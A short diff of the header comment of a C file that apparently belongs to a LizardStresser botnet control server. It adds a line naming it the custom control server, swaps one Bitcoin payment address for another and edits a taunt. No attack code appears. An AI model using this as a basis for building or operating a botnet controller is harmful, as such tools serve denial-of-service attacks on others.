@@ -1,12 +1,13 @@
 /*
   Chippy1337 and @packetprofit present:
   LizardStresser rekt
+  This is the custom control server
 
   LICENSE AGREEMENT:
     If you lulz'd, you must sent BTC to
-    129UQoB3JvZg3iDERYZiXeHPkwT1iJF8u4
+    121cywjXYCUSL2qN7MnQAzSHNsWotUrea7
 
-  Death to skids and lamers
+  Death to skids
 */
 #include <stdio.h>
 #include <stdlib.h>
